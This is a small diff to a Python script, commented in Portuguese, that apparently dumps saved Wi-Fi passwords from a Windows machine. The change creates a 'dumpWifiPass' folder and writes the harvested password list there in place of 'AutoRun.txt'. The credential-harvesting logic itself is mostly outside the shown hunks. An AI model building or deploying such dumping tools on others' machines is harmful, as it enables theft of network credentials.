@@ -1,6 +1,14 @@
 # -*- coding: utf-8 -*-
 from subprocess import check_output
 import re
+import os
+
+# cria um diretorio para armazenar o dump caso este ainda n exista
+try:
+        os.mkdir("dumpWifiPass")
+except:
+        pass
+
 
 LIST_USER_PASS = []
 
@@ -37,7 +45,7 @@ def filter_pass(list_pass):
         return temp_list
 
 def criar_arquivo_de_senhas():
-        arq = open("AutoRun.txt", "w")
+        arq = open(".\\dumpWifiPass\\Wifi.txt", "w")
         arq.write("--------- WIFI PASSWORDS ---------\n")
         for i in LIST_USER_PASS:
                 arq.write(i)
